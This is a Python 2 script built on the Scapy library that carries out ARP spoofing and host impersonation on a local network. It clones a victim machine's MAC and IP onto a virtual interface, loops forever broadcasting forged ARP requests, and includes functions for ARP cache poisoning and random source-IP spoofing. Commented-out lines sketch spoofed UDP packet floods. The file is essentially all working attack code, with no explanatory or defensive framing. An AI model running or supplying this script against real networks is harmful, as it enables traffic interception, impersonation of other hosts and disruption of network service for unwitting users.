from scapy.all import *

import time
from os import popen
from random import randrange
import signal

def getmac(targetip):
  arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
  targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
  return targetmac
def getmacSpoof(victimIP,victimMAC):
  arppacket= Ether(src=victimMAC,dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst='10.12.21.1',psrc=victimIP)  
  sendp(arppacket, verbose= False)
def spoofarpcache(targetip, targetmac, sourceip, sourcemac):
  spoofed=  Ether(src=sourcemac)/ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac , hwsrc=sourcemac)
 
  # spoofed=  Ether(src=sourcemac)/ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
  # spoofed = Ether(src=sourcemac)/IP(dst=targetip,src=sourceIPgen())/UDP(dport=1,sport=80)

  # spoofed = Ether()/IP(dst='10.0.0.2',src=sourceIPgen())/UDP(dport=1,sport=80)
  sendp(spoofed, verbose= False)
  # spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
  # send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
  packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
  send(packet, verbose=False)
  print "ARP Table restored to normal for", targetip

def exit_gracefully(self,signum, frame):
    raise KeyboardInterrupt()

def main():
  # signal.signal(signal.SIGINT, exit_gracefully)
  # targetip= raw_input("Enter Target IP:")
  # targetip="10.0.0.4"
  victimip="10.0.0.1"
  # try:
  #   targetmac= getmac(targetip)
  #   print "Target MAC", targetmac
  # except:
  #   print "Target machine did not respond to ARP broadcast"
  #   quit()

  interface = popen('ifconfig | awk \'/eth0:/ {print $1}\'').read().rstrip()[:-1]
  vinterface=interface+'.0'
  try:
    print "Turnoff virtual interface"
    popen('ifconfig '+vinterface+' down')
    popen('ip link del link '+interface+' '+vinterface)
    print "Clear config", vinterface
  except:
    print "victim machine did not respond to ARP broadcast"
    quit()
  try:
    victimmac= getmac(victimip)
    print "victim MAC", victimmac
  except:
    print "victim machine did not respond to ARP broadcast"
    quit()
 
 
  popen('ip link add link '+interface+' address '+victimmac+' '+vinterface+' type macvlan mode bridge')
  # print 'ip link add link '+interface+' address '+victimmac+' '+vinterface+' type macvlan mode bridge'
  popen('ifconfig '+vinterface+' '+victimip+' netmask 255.255.255.0 up')
  try:
    print "Sending spoofed ARP responses"
    while True:
      # spoofed = Ether()/IP(dst='10.0.0.2',src=sourceIPgen())/UDP(dport=1,sport=80)
      # packets = Ether(src=RandMAC())/IP(dst='10.0.0.2',src=sourceIPgen())/UDP(dport=1,sport=80)
      # sendp(packets,iface=interface.rstrip(), verbose= False,inter=1)

      # spoofarpcache(targetip, targetmac, victimip,victimmac)
      getmacSpoof(victimip,victimmac)

      time.sleep(1)
      # spoofarpcache(gatewayip, gatewaymac, targetip)
  except KeyboardInterrupt:
    print "ARP spoofing stopped"
    print "Turnoff virtual interface"
    popen('ifconfig '+vinterface+' down')
    popen('ip link del link '+interface+' '+vinterface)
    # restorearp(gatewayip, gatewaymac, targetip, targetmac)
    # restorearp(targetip, targetmac, gatewayip, gatewaymac)
    quit()

def sourceIPgen():

#this function generates random IP addresses
# these values are not valid for first octet of IP address

  not_valid = [10,127,254,255,1,2,169,172,192]

  first = randrange(1,256)


  while first in not_valid:
    first = randrange(1,256)
    # print first
  ip = ".".join([str(first),str(randrange(1,256)), str(randrange(1,256)),str(randrange(1,256))])
  # print ip
  return ip

if __name__=="__main__":
  main()
